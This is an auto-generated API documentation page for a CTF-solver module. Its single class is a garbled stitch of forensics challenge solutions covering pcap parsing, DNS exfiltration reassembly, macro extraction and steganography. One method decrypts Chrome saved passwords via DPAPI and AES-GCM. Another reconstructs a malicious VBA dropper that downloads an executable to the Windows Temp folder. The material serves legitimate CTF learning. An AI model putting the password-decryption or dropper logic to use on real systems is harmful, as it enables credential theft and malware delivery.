<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
<meta name="generator" content="pdoc3 0.11.6">
<title>ctfsolver.find_usage.gathering API documentation</title>
<meta name="description" content="">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/sanitize.min.css" integrity="sha512-y1dtMcuvtTMJc1yPgEqF0ZjQbhnc/bFhyvIyVNb9Zk5mIGtqVaAB1Ttl28su8AvFMOY0EwRbAe+HCLqj6W7/KA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/13.0.0/typography.min.css" integrity="sha512-Y1DYSb995BAfxobCkKepB1BqJJTPrOp3zPL74AWFugHHmmdcvO+C48WLrUOlhGMc0QG7AE3f7gmvvcrmX2fDoA==" crossorigin>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css" crossorigin>
<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:1.5em;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:2em 0 .50em 0}h3{font-size:1.4em;margin:1.6em 0 .7em 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .2s ease-in-out}a:visited{color:#503}a:hover{color:#b62}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900;font-weight:bold}pre code{font-size:.8em;line-height:1.4em;padding:1em;display:block}code{background:#f3f3f3;font-family:"DejaVu Sans Mono",monospace;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source > summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible;min-width:max-content}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em 1em;margin:1em 0}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul ul{padding-left:1em}.toc > ul > li{margin-top:.5em}}</style>
<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js" integrity="sha512-D9gUyxqja7hBtkWpPWGt9wfbfaMGVt9gnyCvYa+jojwwPHLCzUm5i8rpk7vD7wNee9bA35eYIjobYPaQuKS1MQ==" crossorigin></script>
<script>window.addEventListener('DOMContentLoaded', () => {
hljs.configure({languages: ['bash', 'css', 'diff', 'graphql', 'ini', 'javascript', 'json', 'plaintext', 'python', 'python-repl', 'rust', 'shell', 'sql', 'typescript', 'xml', 'yaml']});
hljs.highlightAll();
/* Collapse source docstrings */
setTimeout(() => {
[...document.querySelectorAll('.hljs.language-python > .hljs-string')]
.filter(el => el.innerHTML.length > 200 && ['"""', "'''"].includes(el.innerHTML.substring(0, 3)))
.forEach(el => {
let d = document.createElement('details');
d.classList.add('hljs-string');
d.innerHTML = '<summary>"""</summary>' + el.innerHTML.substring(3);
el.replaceWith(d);
});
}, 100);
})</script>
</head>
<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>ctfsolver.find_usage.gathering</code></h1>
</header>
<section id="section-intro">
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="ctfsolver.find_usage.gathering.Gathering"><code class="flex name class">
<span>class <span class="ident">Gathering</span></span>
<span>(</span><span>**kwargs)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class Gathering(CTFSolver):
    def gathering(self):
        pass
        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.image_modified = Path(self.folder_data, &#34;modified.jpg&#34;)
        self.copy(self.challenge_file, self.image_modified)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def modify_picture(self):
        image = Image.open(self.challenge_file.as_posix())

        exif_dict = piexif.load(image.info.get(&#34;exif&#34;, b&#34;&#34;))
        # exif_dict = piexif.load(self.challenge_file)
        exif_bytes = piexif.dump(exif_dict)

        for k, v in exif_dict.items():
            print(k, v)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def copy(self, file1, file2):
        with open(file1, &#34;rb&#34;) as f:
            data = f.read(2048 * 2048)
            with open(file2, &#34;wb&#34;) as f2:
                f2.write(data)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def main(self):
        self.modify_picture()

        # /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def searching_packets(self, packets, text):
        for i, packet in enumerate(packets):
            if packet.haslayer(&#34;Raw&#34;):
                if text.encode() in packet[&#34;Raw&#34;].load:
                    print(f&#34;Found {text} in packet {i}&#34;)
                    print(packet.show())
                    print(packet.summary())
                    return packet[&#34;Raw&#34;].load.decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def main(self):
        self.packets = rdpcap(self.challenge_file.as_posix())
        flag = self.searching_packets(self.packets, &#34;pico&#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def extract_files_from_binary(self, filepath):
        binwalk_obj = binwalk.Binwalk()

        results = binwalk_obj.scan(filepath)

        if not results:
            print(&#34;No files found&#34;)
            return

        for result in results:
            if result.extracted:
                print(f&#34;Extracted {result.file.path}&#34;)
                for extracted_file in result.extracted:
                    print(f&#34;Extracted {extracted_file}&#34;)
            else:
                print(f&#34;Could not extract {result.file.path}&#34;)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def main(self):
        # self.extract_files_from_binary(self.challenge_file)
        pass

        # /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def hexdump_to_binary(self, hexdump_file, binary_file):
        with open(hexdump_file, &#34;rb&#34;) as f:
            hexdump_data = f.read()

        hex_data = []

        for i in range(0, len(hexdump_data), 4):
            chunk = hexdump_data[i : i + 4]
            # If the chunk is less than 4 bytes, pad it with zeros
            if len(chunk) &lt; 4:
                # chunk += b&#34;\x00&#34; * (4 - len(chunk))
                chunk = chunk.ljust(4, b&#34;\x00&#34;)
            hex_data.append(f&#34;{struct.unpack(&#39;&lt;I&#39;, chunk)[0]:08x}&#34;)

        hex_output = &#34;&#34;.join(hex_data)

        binary_output = binascii.unhexlify(hex_output)

        with open(binary_file, &#34;wb&#34;) as f:
            f.write(binary_output)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def main(self):
        self.lastfile = Path(self.folder_data, &#34;lastfile&#34;)
        self.hexdump_to_binary(self.challenge_file, self.lastfile)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Ph4nt0m_1ntrud3r/payloads/solution.py
    def main(self):
        packets = rdpcap(self.challenge_file.as_posix())
        result = {}
        for packet in packets:
            if packet.haslayer(&#34;Raw&#34;) and packet[&#34;Raw&#34;].load is not None:
                result[str(packet.time)] = packet[&#34;Raw&#34;].load

        print(result)

        sorted_keys = sorted(result.keys())
        flag = &#34;&#34;
        for key in sorted_keys:
            if key &gt;= &#34;1741231916.092334&#34;:
                flag += self.decode_base64(result[key].decode(&#34;utf-8&#34;))

        pyperclip.copy(flag)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def differ(self):
        self.list_1_file = self.folfil(&#34;files&#34;, &#34;list.txt&#34;)
        self.list_2_file = self.folfil(&#34;files&#34;, &#34;html_list_2.txt&#34;)

        # Read the first list
        with open(self.list_1_file, &#34;r&#34;) as f:
            self.list_1 = f.read().splitlines()

        # Read the second list
        with open(self.list_2_file, &#34;r&#34;) as f:
            self.list_2 = f.read().splitlines()

        # Get the difference between the two lists
        diff = list(set(self.list_1) - set(self.list_2))
        # Print the difference
        print(diff)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def download_images(self, name):
        url = f&#34;{self.url}:{self.port}/flags/{name}.png&#34;
        try:
            response = requests.get(url)
            if response.status_code == 200:
                flags_path = self.folfil(&#34;files&#34;, &#34;flags&#34;)
                file_path = self.Path(flags_path, f&#34;{name}.png&#34;)
                with open(file_path, &#34;wb&#34;) as f:
                    f.write(response.content)
                print(f&#34;Downloaded {name}.png&#34;)
            else:
                print(f&#34;Error downloading {name}.png&#34;)
        except Exception as e:
            print(f&#34;Error downloading {name}.png&#34;)
            print(e)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def main(self):
        lst = itertools.product(string.ascii_lowercase, repeat=3)
        lst = list(map(lambda x: &#34;&#34;.join(x), lst))

        # for name in lst:
        #     self.download_images(name)

        self.download_images(&#34;upz&#34;)

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def print_to_File(self, data, verbose=False, file_name=&#34;output.txt&#34;):

        if verbose:
            print(data)
        with open(self.folfil(&#34;data&#34;, file_name), &#34;a&#34;) as f:
            f.write(data + &#34;\n&#34;)

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def reassemblying_dns(self, packets=None):
        if packets is None:
            packets = self.packets

        hex_parts = []

        dns_packets = []
        for packet in packets:
            # if packet.haslayer(&#34;DNS&#34;) and packet[&#34;DNS&#34;].qr == 0:  # DNS query
            #     query_name = packet[&#34;DNS&#34;].qd.qname.decode(&#34;utf-8&#34;).strip(&#34;.&#34;)
            #     dns_packets.append(query_name)

            if packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname.decode()
                qname = packet[DNSQR].qname.decode(errors=&#34;ignore&#34;).strip(&#34;.&#34;)

                # Extract the first label (before the first dot)
                # part = qname.split(&#34;.&#34;)[0]
                labels = qname.split(&#34;.&#34;)
                for part in labels:
                    # Must be even-length hex and not too short
                    if re.fullmatch(r&#34;[a-fA-F0-9]{2,}&#34;, part) and len(part) % 2 == 0:
                        if part not in hex_parts:
                            hex_parts.append(part)

        hex_data = &#34;&#34;.join(hex_parts)
        try:
            exfiltrated_data = bytes.fromhex(hex_data).decode(&#34;utf-8&#34;)

            with open(self.folfil(&#34;data&#34;, &#34;exfiltrated.txt&#34;), &#34;w&#34;) as f:
                f.write(exfiltrated_data)

        except ValueError:
            exfiltrated_data = &#34;Invalid hex data&#34;

        return exfiltrated_data

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def breakfiles(self, exfiltrated_data):

        lines = []
        counter = 0
        delimiters = [
            &#34;From&#34;,
            &#34;UEsDBg&#34;,
            &#34;--boundary_AA&#34;,
            &#34;UEsDBg&#34;,
            &#34;Content-Transfer-Encoding: base64&#34;,
        ]

        for line in exfiltrated_data.splitlines():
            if line.startswith(tuple(delimiters)):
                lines.append([])
                counter += 1
            if line != &#34;\n&#34;:
                lines[counter - 1].append(line)

        for i in range(1, counter + 1):
            with open(self.folfil(&#34;data&#34;, f&#34;basefile_{i}.txt&#34;), &#34;w&#34;) as f:
                f.write(&#34;\n&#34;.join(lines[i - 1]))

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def main(self):
        # self.pcap_open()
        self.packets = rdpcap(self.challenge_file.as_posix())
        data = self.reassemblying_dns()

        exfiltrated_file = self.folfil(&#34;data&#34;, &#34;exfiltrated.txt&#34;)

        with open(exfiltrated_file, &#34;r&#34;) as f:
            exfiltrated_data = f.read()

        self.breakfiles(exfiltrated_data)
        chosen_file = self.folfil(&#34;data&#34;, &#34;basefile_2.txt&#34;)
        with open(chosen_file, &#34;r&#34;) as f:
            base64_data = f.readlines()

        # Clean up the first two and last two  lines
        base64_data = [
            line.strip()
            for i, line in enumerate(base64_data)
            if i not in [0, 1, len(base64_data) - 1, len(base64_data) - 2]
        ]

        # Join and clean only base64 chars
        cleaned_data = &#34;\n&#34;.join(base64_data)

        with open(self.folfil(&#34;data&#34;, &#34;base64formated.txt&#34;), &#34;wb&#34;) as f:
            f.write(cleaned_data.encode(&#34;utf-8&#34;))

        # /home/figaro/CTF/Categories/Forensics/bsides/Charter/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Forensics/CSCG/Somebody_Save_Me/payloads/solution.py
    def main(self):
        strings = self.extract_strings(self.challenge_file, min_length=20)

        strings_sorted = sorted(strings, key=len, reverse=True)
        # print(strings_sorted)

        base64_to_try = [2, 9, 12, 13]

        for i in base64_to_try:
            base64_strings = strings_sorted[i]

            decoded = self.decode_base64(base64_strings)
            if decoded is not None and &#34;csc&#34; in decoded:
                print(decoded)
                break

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def main(self):
        text = &#34;mnzwg63ngrrxembvl42hem27oazxezrtmn2gy6k7myyw4m35&#34;

        text = text.upper()
        print(text)

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def trying_to_exploit_ods(self):
        # Extract macros from the ODS file
        # macros = self.extract_macros_from_ods_initial()
        # Print the extracted macros

        files = self.list_all_files(self.challenge_file)
        # macros = self.extract_macros_with_odfpy(self.challenge_file)
        macros = self.extract_macros_with_odfpy(self.challenge_file, files)
        print(macros)

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_with_odfpy(self, ods_file, files):
        macros = []
        with zipfile.ZipFile(ods_file, &#34;r&#34;) as z:
            for file in files:
                if file.endswith(&#34;.xml&#34;):
                    with z.open(file) as f:
                        try:
                            # Parse the XML file
                            tree = ET.parse(f)
                            root = tree.getroot()

                            # Search for macro-related elements
                            for elem in root.iter():
                                if elem.tag.endswith(&#34;script&#34;):
                                    macros.append(ET.tostring(elem, encoding=&#34;unicode&#34;))

                        except ET.ParseError:
                            print(f&#34;Error parsing {file}. Skipping...&#34;)

        if macros:
            # Pretty-print the extracted macros
            pretty_macros = [
                parseString(macro).toprettyxml(indent=&#34;  &#34;) for macro in macros
            ]
            return &#34;\n\n&#34;.join(pretty_macros)
        else:
            return &#34;No macros found.&#34;

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def list_all_files(self, ods_file):
        &#34;&#34;&#34;
        Lists all files in the ODS archive for manual inspection.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            list: A list of files inside the ODS archive.
        &#34;&#34;&#34;
        with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
            return ods.namelist()

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_file(self, ods_file, file_name):
        &#34;&#34;&#34;
        Extracts content from a specific file inside the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.
            file_name (str): Name of the file inside the archive to extract.

        Returns:
            str: The content of the specified file.
        &#34;&#34;&#34;
        try:
            with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
                with ods.open(file_name) as file:
                    return file.read().decode(&#34;utf-8&#34;)
        except Exception as e:
            return f&#34;Failed to extract {file_name}: {e}&#34;

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods(self, ods_file):
        &#34;&#34;&#34;
        Attempts to extract macros from various files in the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros or debug information.
        &#34;&#34;&#34;
        try:
            # List all files in the ODS archive
            all_files = self.list_all_files(ods_file)

            # Identify potential macro-related files
            macro_candidates = [
                f
                for f in all_files
                if &#34;scripts&#34; in f or &#34;content&#34; in f or &#34;settings&#34; in f
            ]

            macros = []
            for candidate in macro_candidates:
                content = self.extract_macros_from_file(ods_file, candidate)
                if &#34;&lt;script&#34; in content or &#34;&lt;macro&#34; in content:
                    macros.append(f&#34;--- Content from {candidate} ---\n{content}&#34;)

            if macros:
                return &#34;\n\n&#34;.join(macros)
            else:
                return &#34;No explicit macros found. Check the file structure manually.&#34;

        except Exception as e:
            return f&#34;An error occurred: {e}&#34;

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods_initial(self, ods_file=None):
        &#34;&#34;&#34;
        Extracts macros from an ODS file.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros, if any, as plain XML text.
        &#34;&#34;&#34;

        if ods_file is None:
            ods_file = self.challenge_file

        try:
            with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
                # List all files in the archive
                file_list = ods.namelist()

                # Look for possible macro-related files
                potential_files = [
                    f
                    for f in file_list
                    if f in (&#34;content.xml&#34;, &#34;scripts.xml&#34;, &#34;settings.xml&#34;, &#34;meta.xml&#34;)
                ]
                macros = []

                for file_name in potential_files:
                    with ods.open(file_name) as file:
                        xml_content = file.read()
                        root = ET.fromstring(xml_content)

                        # Search for common macro tags (e.g., &lt;script&gt;, &lt;macro&gt;)
                        for macro in root.iter():
                            if any(
                                keyword in macro.tag.lower()
                                for keyword in (&#34;script&#34;, &#34;macro&#34;)
                            ):
                                macros.append(ET.tostring(macro, encoding=&#34;unicode&#34;))

                if macros:
                    return &#34;\n\n&#34;.join(macros)
                else:
                    return &#34;No macros found in the ODS file.&#34;

        except zipfile.BadZipFile:
            return &#34;The provided file is not a valid ODS file.&#34;
        except ET.ParseError:
            return &#34;Failed to parse XML content from the ODS file.&#34;
        except Exception as e:
            return f&#34;An error occurred: {e}&#34;

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def connecting_db(self):
        with sqlite3.connect(self.challenge_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                &#34;SELECT action_url, username_value, password_value FROM logins&#34;
            )
            return cursor.fetchall()

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def load_master_key(self):
        with open(self.Path(self.folder_files, &#34;mkey.json&#34;), &#34;r&#34;) as mkey_file:
            mkey_data = json.load(mkey_file)
        master_key_id = list(mkey_data[&#34;masterkeys&#34;].keys())[0]
        master_key = bytes.fromhex(mkey_data[&#34;masterkeys&#34;][master_key_id])
        return master_key

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def main(self):
        with open(self.Path(self.folder_files, &#34;Local_State&#34;)) as login_state:
            login_state = json.load(login_state)

        encrypted_key = login_state[&#34;os_crypt&#34;][&#34;encrypted_key&#34;]
        encrypted_key = base64.b64decode(encrypted_key)[2:-1]
        # decrypted_key = win32crypt.CryptUnprotectData(
        #     encrypted_key, None, None, None, 0
        # )[1]

        # master_key = self.load_master_key()
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[
            1
        ]

        print(&#34;Connecting to database&#34;)
        logins = self.connecting_db()

        url = logins[0][0]
        username = logins[0][1]
        password = logins[0][2]
        print(password)
        # decrypted = self.decrypt_password(password, encrypted_key)
        decrypted = self.decrypt_password(password, master_key)

        print(decrypted)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_password(self, ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print(&#34;%s&#34; % str(e))
            print(
                &#34;[ERR] Unable to decrypt, Chrome version &lt;80 not supported. Please check.&#34;
            )
            return &#34;&#34;

        # /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def translated(self):  # Reconstructing the strings based on the VBA code logic
        part_1 = (
            &#34;https://elvesfactory/&#34;
            + chr(ord(&#34;H&#34;))
            + chr(84)
            + chr(ord(&#34;B&#34;))
            + &#34;&#34;
            + chr(123)
            + &#34;&#34;
            + chr(84)
            + chr(ord(&#34;h&#34;))
            + &#34;1&#34;
            + chr(125 - 10)
            + chr(ord(&#34;_&#34;))
            + &#34;1s&#34;
            + chr(95)
            + &#34;4&#34;
        )
        part_2 = &#34;_&#34; + &#34;present&#34;.replace(&#34;e&#34;, &#34;3&#34;) + chr(85 + 10)
        part_3 = &#34;everybody&#34;.replace(&#34;e&#34;, &#34;3&#34;)
        part_3 = part_3.replace(&#34;o&#34;, &#34;0&#34;) + &#34;_&#34;
        part_4 = (
            chr(ord(&#34;w&#34;))
            + &#34;4&#34;
            + chr(110)
            + &#34;t&#34;
            + chr(115)
            + &#34;_&#34;
            + chr(ord(&#34;f&#34;))
            + &#34;0&#34;
            + chr(121 - 7)
            + chr(95)
        )
        part_5 = &#34;christmas&#34;.replace(&#34;i&#34;, &#34;1&#34;)
        part_5 = part_5.replace(&#34;a&#34;, &#34;4&#34;) + chr(119 + 6)

        # Resultant concatenated string for &#34;strRT&#34;
        part_6 = part_1 + part_2 + part_3 + part_4 + part_5

        # Generating the &#39;strTecation&#39; path
        part_7 = &#34;c:\\&#34; + chr(ord(&#34;W&#34;)) + &#34;indows\\&#34; + chr(ord(&#34;T&#34;)) + &#34;emp\\444.exe&#34;

        # Placeholder for variable `mttt`, assuming it is defined elsewhere
        mttt = 120  # Adjust as per VBA code logic
        part_7 = (
            &#39;CreateObject(&#34;MSXML2.&#39;
            + chr(mttt - 54)
            + chr(mttt)
            + chr(mttt - 11)
            + chr(mttt - 12)
            + chr(72)
            + chr(84)
            + chr(84)
            + chr(80)
            + &#39;&#34;)&#39;
        )

        # Simulating VBA code file writing
        output_lines = []
        output_lines.append(f&#34;strRT = {part_6}&#34;)
        output_lines.append(f&#39;strTecation = &#34;{part_7}&#34;&#39;)
        output_lines.append(f&#34;Set objXMLHTTP = {part_7}&#34;)
        output_lines.append(&#39;objXMLHTTP.open &#34;GET&#34;, strRT, False&#39;)
        output_lines.append(&#34;objXMLHTTP.send()&#34;)
        output_lines.append(&#34;If objXMLHTTP.Status = 200 Then&#34;)
        output_lines.append(&#39;Set objADOStream = CreateObject(&#34;ADODB.Stream&#34;)&#39;)
        output_lines.append(&#34;objADOStream.Open&#34;)
        output_lines.append(&#34;objADOStream.Type = 1&#34;)
        output_lines.append(&#34;objADOStream.Write objXMLHTTP.ResponseBody&#34;)
        output_lines.append(&#34;objADOStream.Position = 0&#34;)
        output_lines.append(f&#34;objADOStream.SaveToFile {part_7}&#34;)
        output_lines.append(&#34;objADOStream.Close&#34;)
        output_lines.append(&#34;Set objADOStream = Nothing&#34;)
        output_lines.append(&#34;End if&#34;)
        output_lines.append(&#34;Set objXMLHTTP = Nothing&#34;)
        output_lines.append(&#39;Set objShell = CreateObject(&#34;WScript.Shell&#34;)&#39;)

        # Printing the output lines (would typically write to a file)
        for line in output_lines:
            print(line)

        # Values of constructed variables for validation
        print(&#34;Constructed Values:&#34;)
        print(&#34;HPkXUcxLcAoMHOlj:&#34;, part_1)
        print(&#34;cxPZSGdIQDAdRVpziKf:&#34;, part_2)
        print(&#34;fqtSMHFlkYeyLfs:&#34;, part_3)
        print(&#34;ehPsgfAcWaYrJm:&#34;, part_4)
        print(&#34;FVpHoEqBKnhPO:&#34;, part_5)
        print(&#34;strRT:&#34;, part_6)
        print(&#34;strTecation:&#34;, part_7)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def main(self):
        self.translated()

        # /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packets_icmp(self, packets=None):
        &#34;&#34;&#34;
        Description:
        Get all the ICMP packets from the packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of ICMP packets
        &#34;&#34;&#34;

        if packets is None:
            packets = self.packets

        icmp_packets = [packet for packet in packets if packet.haslayer(&#34;ICMP&#34;)]

        return icmp_packets

        # /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packet_ttl(self, packets=None):
        &#34;&#34;&#34;
        Description:
        Get the TTL of all the ICMP packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of TTL of the ICMP packets
        &#34;&#34;&#34;
        if packets is None:
            packets = self.packets

        icmp_ttl = [packet.ttl for packet in packets]

        return icmp_ttl

        # /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def main(self):
        self.pcap_open()
        icmp_packets = self.get_packets_icmp()
        ttl = self.get_packet_ttl(packets=icmp_packets)

        flag = &#34;&#34;
        for i in ttl:
            if i != 64:
                flag += chr(i)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def main(self):
        text = self.textFromPDF()
        partial_flag = &#34;NH&#34;
        shift = self.rot_bruteforce(text, partial_flag)
        # ROT47
        print(f&#34;Shift: {shift}&#34;)
        flag = self.rot(text, shift)
        self.flag = flag
        print(f&#34;Flag: {flag}&#34;)

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        &#34;&#34;&#34;
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        &#34;&#34;&#34;
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot(self, text, shift):
        &#34;&#34;&#34;
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        &#34;&#34;&#34;
        return &#34;&#34;.join([self.rot_char(c, shift) for c in text])

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_char(self, c, shift):
        &#34;&#34;&#34;
        Rotates a single character using the ROT47 cipher.

        Args:
